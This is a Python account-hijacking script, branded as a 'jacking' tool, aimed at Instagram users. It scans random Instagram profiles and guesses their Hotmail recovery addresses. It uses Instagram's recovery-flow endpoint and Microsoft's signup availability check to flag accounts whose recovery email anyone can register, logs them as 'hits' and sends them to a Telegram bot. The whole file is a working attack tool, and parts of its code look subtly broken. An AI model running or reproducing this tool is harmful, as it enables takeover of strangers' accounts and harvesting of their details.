print("MADE BY #𝐍𝐈𝐊𝐙| @NikzPy • ")
import requests
import uuid
from secrets import token_hex
from user_agent import generate_user_agent
import hashlib
from threading import Thread
import random
import time
import string, json, sys
from cfonts import render



bads_instgram = 0
hits = 0
bads_email = 0
aca = 0

LIGHT_GRAY = "\033[0;37m"
LIGHT_RED = "\033[1;31m"
LIGHT_GREEN = "\033[1;32m"
LIGHT_YELLOW = "\033[1;33m"
LIGHT_BLUE = "\033[1;34m"
LIGHT_PURPLE = "\033[1;35m"
LIGHT_CYAN = "\033[1;36m"
G = "\033[1;32m"  
r = "\033[0m"
X = '\033[1;33m' 
bo = "\033[1m"
bbo = "\033[1m"
Z = '\x1b[1;31m'
R = '\x1b[1;31m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
C = '\x1b[1;97m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'
E = '\x1b[1;31m'
B = '\x1b[2;36m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
C1 = '\x1b[2;35m'
cyan = '\033[1m\033[36m'
red= '\033[91m'
orange='\x1b[1m\x1b[38;5;208m'

# Rainbow text function
def rainbow_text(text):
    colors = [
        '\033[91m',  # Red
        '\033[93m',  # Yellow
        '\033[92m',  # Green
        '\033[96m',  # Cyan
        '\033[94m',  # Blue
        '\033[95m',  # Magenta
    ]
    reset = '\033[0m'
    colored_text = ''
    
    for i, char in enumerate(text):
        colored_text += colors[i % len(colors)] + char
    
    return f"{colored_text + reset}"
    
    # Display banner
text = "RAINBOW COLORS"
print(rainbow_text('This Tool is By  #𝐍𝐈𝐊𝐙 |  BY  @NikzPy • '))
print("\033[1;32m" + "▄▀" * 30)
print(f"\033[1;94m╔{'═' * 58}╗")
blue = "\033[1m\033[34m"
green = "\033[1m\033[32m"
WDEH = render('#NiKZ', colors=['blue', 'green'], align='center')
print(WDEH)
print('')
print('         🕵️‍♂️ JACKING TOOLS   |    🛠️ Developer: @NikzPy ')                                                           
print("\033[1;94m" + "╚══════════════════════════════════════════════════════════╝" )

print("\033[1;32m" + "▄▀" * 30)


def to(s):
    for char in s + "\n":
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(500.0 / 8000)
        

import telegram
from datetime import datetime
import webbrowser
expiration_date = "2025-02-28 23:39:35"
expiration_datetime = datetime.strptime(expiration_date, "%Y-%m-%d %H:%M:%S")

# Get current date and time
current_datetime = datetime.now()

# Check if expired
if current_datetime > expiration_datetime:
    print(f"{red}The code has expired.{red}")
    print("Contact to owner")
    webbrowser.open('https://t.me/NikzPy')
    exit()
else:
    remaining_time = expiration_datetime - current_datetime
    print(f"{orange}The code is still valid. Time remaining: {remaining_time}")
try:
    ID = int(input(f"{green}Enter your Telegram User ID:{cyan} "))
except ValueError:
    print(f"{red}Invalid input. Please enter a numeric Telegram User ID.")
    exit()

token = input(f"{green}Enter Token -{cyan} ") 


print('')
def rest(user):
  try:
    headers = {
    'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
    'X-Pigeon-Rawclienttime': '1700251574.982',
    'X-IG-Connection-Speed': '-1kbps',
    'X-IG-Bandwidth-Speed-KBPS': '-1.000',
    'X-IG-Bandwidth-TotalBytes-B': '0',
    'X-IG-Bandwidth-TotalTime-MS': '0',
    'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
    'X-IG-Connection-Type': 'WIFI',
    'X-IG-Capabilities': '3brTvw==',
    'X-IG-App-ID': '567067343352427',
    'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
    'Accept-Language': 'en-GB, en-US',
     'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Host': 'i.instagram.com',
    'X-FB-HTTP-Engine': 'Liger',
    'Connection': 'keep-alive',
    'Content-Length': '356',
}
    data = {
    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
    'ig_sig_key_version': '4',
  }
    response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
    r=response['email']
  except:
    r='False'
  return r
from rich.panel import Panel
from rich import print
def form(username, f1):
  global hits,aca
  hits+=1
  try:
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'origin': 'https://storiesig.info',
    'priority': 'u=1, i',
    'referer': 'https://storiesig.info/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
    rrr = requests.get(f'https://api-ig.storiesig.info/api/userInfoByUsername/{username}', headers=headers).json()
    Id = rrr['result']['user']['pk']
    fows = rrr['result']['user']['follower_count']
    fowg = rrr['result']['user']['following_count']
    pp = rrr['result']['user']['media_count']
    try:
      api = 'https://alany.pythonanywhere.com/'
      params = {'id':Id}
      response = requests.get(api,params=params).json()
      date=response['date']
      
    except:
      date='none'
    aca+=1
    tlg = f'''
𖢦 𝐍𝐄𝐖 𝐇𝐈𝐓 
𝐁𝐘 : @NikzPy
𝗛𝗜𝗧 : {aca}
𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 : {fows}
𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 : {fowg}
𝗣𝗢𝗦𝗧𝗦 : {pp}
𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : {username}
𝗗𝗔𝗧𝗘 : {date}
𝗘𝗠𝗔𝗜𝗟 : {username}@{f1}
𝗥𝗘𝗦𝗧 : {rest(username)}
'''
    print(Panel(f'{tlg}',title='NEW HIT', style='cyan'))
    with open('Nikz.txt','a') as ff:
      ff.write(f'{tlg}\n')
    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
  except:
    aca+=1
    tlg = f'''
𖢦 𝐍𝐄𝐖 𝐇𝐈𝐓 𝐁𝐘 : @NikzPy
𝗛𝗜𝗧  :  {aca}
𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : {username}
𝗘𝗠𝗔𝗜𝗟 : {username}@{f1}
𝗥𝗘𝗦𝗧 : {rest(username)}
𝗨𝗥𝗟 : https://www.instagram.com/{username}
'''
    print(Panel(f'{tlg}',title='NEW HIT', style='cyan'))
    try:requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
    except:pass
    with open('.txt','a') as ff:
      ff.write(f'{tlg}\n')
def email():
   while True:
    try:
        LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        UseriD = str(random.randrange(10000,17699999,263014407,361365133,1629010000,2500000000,3713668786))
        variables = json.dumps({"id": UseriD, "render_surface": "PROFILE"})
        data = {"lsd": LsD, "variables": variables, "doc_id": "25618261841150840"}
        response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD}, data=data)
        username = response.json()['data']['user']['username']
        email=username+'@hotmail.com'
        check(email)
    except:''
for _ in range(100):
  Thread(target=email).start()

ii = str(uuid.uuid4())
gg = token_hex(8) * 2
resp = requests.post('https://signup.live.com')
sc = resp.cookies.get('amsc')
ry = resp.text.split('"apiCanary":"')[1].split('"')[0].encode().decode('unicode_escape')
  
def hotmail(email):
    global bads_email
    headers = {
        'canary': ry,
        'client-request-id': ii,
        'correlationid': ii,
        'user-agent': str(generate_user_agent()),
    }
    json_data = {
        'signInName': email,
        'uaid': ii,
    }
    cookies = {'amsc': sc}
    response = requests.post(f'https://signup.live.com/API/CheckAvailableSigninNames?uaid={ii}', cookies=cookies, headers=headers, json=json_data).text
    if '"isAvailable":true' in response:
        username,f1=email.split('@')
        form(username,f1)
    else:bads_email+=1
def check(email):
 global bads_instgram
 try:
  dev = 'android-'
  device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
  uui = str(uuid.uuid4())
  headers = {'User-Agent': generate_user_agent(),'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',}
  data = {
      'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
        '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'adid': uui,
        'guid': uui,
        'device_id': device_id,
        'query': email
    }),
    'ig_sig_key_version': '4',
}
  response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
  if '"status":"ok"' in response:hotmail(email)
  else:bads_instgram+=1
 except:''
 bi = random.randint(5,208)
 bos = f'{bo}\x1b[38;5;{bi}m'
 sys.stdout.write(f'''\r{bos}{bbo} ⌾⃝ ౪{r}{bbo} #𝐍𝐈𝐊𝐙 {bos}⌾⃝ ๑ {r} {bbo}⚡ Hits :{r} {bbo}{G}{hits}{r} {bbo}🚫 Bad IG :{r}{bbo} {LIGHT_RED}{bads_instgram} {r}{bbo}🗑️ Bad Email : {r}{bbo}{X}{bads_email}{r}{bbo}{r}{bos}\r''')
 
 
